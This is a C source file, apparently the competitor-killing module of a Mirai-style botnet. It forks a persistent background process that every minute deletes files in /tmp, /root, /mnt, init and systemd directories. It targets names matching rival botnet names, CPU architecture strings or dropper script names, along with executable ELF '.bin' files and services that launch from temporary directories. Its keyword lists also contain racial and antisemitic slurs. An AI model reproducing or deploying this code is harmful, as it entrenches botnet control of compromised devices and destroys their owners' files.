#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "includes.h"
#include "delete.h"
#include "util.h"
#include "table.h"

static int delete_pid;

static const char *scan_dirs[] = {
    "/tmp", "/var/tmp", "/dev/shm", "/var/run",
    "/data/local/tmp", "/mnt", "/root",
    "/etc/init.d", "/etc/systemd/system",
    NULL
};

static const char *arch_tokens[] = {
    "x86", "x86_64", "i586", "i686",
    "arm", "arm4", "arm5", "arm6", "arm7",
    "mips", "mipsel", "mpsl",
    "ppc", "powerpc",
    "sh4", "sparc", "spc",
    "m68k", "arc",
    NULL
};

static const char *keyword_tokens[] = {
    "nigga", "nigger", "jew", "boatnet", "monero",
    "botnet", "mirai", "sora", "owari", "qbot",
    "vamp", "omni", "shinto", "masuta", "remaiten",
    "xordd", "light", "freak", "dvr", "gafgyt",
    "tsunami", "flood", "kaiten", "diesel", "flutter",
    NULL
};

static const char *suspicious_sh[] = {
    "run.sh", "load.sh", "dropper.sh", "infect.sh", "flutter.sh",
    "deploy.sh", "setup.sh", "install.sh", "wget.sh",
    "curl.sh", "tftp.sh", "go.sh", "get.sh", "nigger.sh",
    "payload.sh", "start.sh", "scan.sh", "nigga.sh",
    NULL
};

static const char *whitelist_prefixes[] = {
    "/proc/", "/sys/",
    NULL
};

static char self_path[256] = {0};

static int is_whitelisted(const char *path)
{
    int i;
    if (path == NULL) return 1;
    if (self_path[0] && util_strcmp((char *)path, self_path))
        return 1;
    for (i = 0; whitelist_prefixes[i] != NULL; i++)
    {
        if (util_strncmp((char *)path, (char *)whitelist_prefixes[i],
            util_strlen((char *)whitelist_prefixes[i])))
            return 1;
    }
    return 0;
}

static int has_token(const char *name, const char **tokens)
{
    int i;
    if (name == NULL) return 0;
    for (i = 0; tokens[i] != NULL; i++)
    {
        if (util_strstr((char *)name, (char *)tokens[i]) != NULL)
            return 1;
    }
    return 0;
}

static int match_suspicious_sh(const char *name)
{
    int i;
    if (name == NULL) return 0;
    for (i = 0; suspicious_sh[i] != NULL; i++)
    {
        if (util_strcmp((char *)name, (char *)suspicious_sh[i]))
            return 1;
    }
    return 0;
}

static int should_delete(const char *name)
{
    if (name == NULL || name[0] == '.') return 0;
    if (match_suspicious_sh(name)) return 1;
    if (has_token(name, arch_tokens)) return 1;
    if (has_token(name, keyword_tokens)) return 1;
    return 0;
}

static void delete_service_file(const char *path)
{
    if (!path || is_whitelisted(path)) return;
    unlink(path);
}

static void scan_dir_for_services(void)
{
    DIR *dir;
    struct dirent *entry;
    char path[512];

    dir = opendir("/etc/systemd/system");
    if (dir)
    {
        while ((entry = readdir(dir)) != NULL)
        {
            if (entry->d_name[0] == '.') continue;
            if (should_delete(entry->d_name))
            {
                util_strcpy(path, "/etc/systemd/system/");
                util_strcpy(path + util_strlen(path), entry->d_name);
                delete_service_file(path);
                util_strcpy(path + util_strlen(path), ".wants");
                unlink(path);
            }
            else if (util_strstr(entry->d_name, ".service") != NULL)
            {
                util_strcpy(path, "/etc/systemd/system/");
                util_strcpy(path + util_strlen(path), entry->d_name);
                if (access(path, F_OK) == 0)
                {
                    int fd = open(path, O_RDONLY);
                    if (fd != -1)
                    {
                        char buf[1024];
                        int n = read(fd, buf, sizeof(buf) - 1);
                        close(fd);
                        if (n > 0)
                        {
                            buf[n] = 0;
                            if (util_strstr(buf, (char *)"ExecStart") != NULL &&
                                (util_strstr(buf, (char *)"/tmp") != NULL ||
                                 util_strstr(buf, (char *)"/var/tmp") != NULL ||
                                 util_strstr(buf, (char *)"/dev/shm") != NULL))
                                delete_service_file(path);
                        }
                    }
                }
            }
        }
        closedir(dir);
    }

    dir = opendir("/etc/init.d");
    if (dir)
    {
        while ((entry = readdir(dir)) != NULL)
        {
            if (entry->d_name[0] == '.') continue;
            if (should_delete(entry->d_name))
            {
                util_strcpy(path, "/etc/init.d/");
                util_strcpy(path + util_strlen(path), entry->d_name);
                delete_service_file(path);
            }
        }
        closedir(dir);
    }
}

static void delete_file_at(const char *dir, const char *name)
{
    char path[256];
    int plen = util_strlen((char *)dir);
    int nlen = util_strlen((char *)name);
    if (plen + nlen + 2 > (int)sizeof(path)) return;
    util_strcpy(path, (char *)dir);
    path[plen] = '/';
    util_strcpy(path + plen + 1, (char *)name);
    if (is_whitelisted(path)) return;
    unlink(path);
}

static void scan_dir(const char *dirpath)
{
    DIR *dir;
    struct dirent *entry;
    struct stat st;

    if (lstat(dirpath, &st) != 0)
        return;

    dir = opendir(dirpath);
    if (dir == NULL) return;

    while ((entry = readdir(dir)) != NULL)
    {
        char sub[256];
        int dlen = util_strlen((char *)dirpath);
        int nlen = util_strlen(entry->d_name);

        if (entry->d_name[0] == '.') continue;

        if (dlen + nlen + 2 > (int)sizeof(sub)) continue;

        util_strcpy(sub, (char *)dirpath);
        sub[dlen] = '/';
        util_strcpy(sub + dlen + 1, entry->d_name);

        if (lstat(sub, &st) != 0) continue;

        if (S_ISDIR(st.st_mode))
        {
            if (!is_whitelisted(sub))
            {
                if (should_delete(entry->d_name))
                {
                    rmdir(sub);
                }
                else
                {
                    scan_dir(sub);
                }
            }
        }
        else if (S_ISREG(st.st_mode) || S_ISLNK(st.st_mode))
        {
            if (should_delete(entry->d_name))
            {
                delete_file_at(dirpath, entry->d_name);
            }
            else
            {
                if (nlen >= 4 &&
                    util_strcmp(entry->d_name + nlen - 4, ".bin") &&
                    access(sub, X_OK) == 0 &&
                    !is_whitelisted(sub))
                {
                    int fd = open(sub, O_RDONLY);
                    if (fd != -1)
                    {
                        char magic[4];
                        int n = read(fd, magic, 4);
                        close(fd);
                        if (n == 4 && magic[0] == 0x7F && magic[1] == 'E' &&
                            magic[2] == 'L' && magic[3] == 'F')
                            unlink(sub);
                    }
                }
            }
        }
    }
    closedir(dir);
}

void delete_init(void)
{
    delete_pid = fork();
    if (delete_pid > 0 || delete_pid == -1) return;

    {
        int len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        if (len != -1) self_path[len] = 0;
    }

    scan_dir_for_services();

    while (1)
    {
        int i;
        for (i = 0; scan_dirs[i] != NULL; i++)
            scan_dir(scan_dirs[i]);
        scan_dir_for_services();
        sleep(60);
    }
}

void delete_scan_all(void)
{
    int i;
    for (i = 0; scan_dirs[i] != NULL; i++)
        scan_dir(scan_dirs[i]);
    scan_dir_for_services();
}
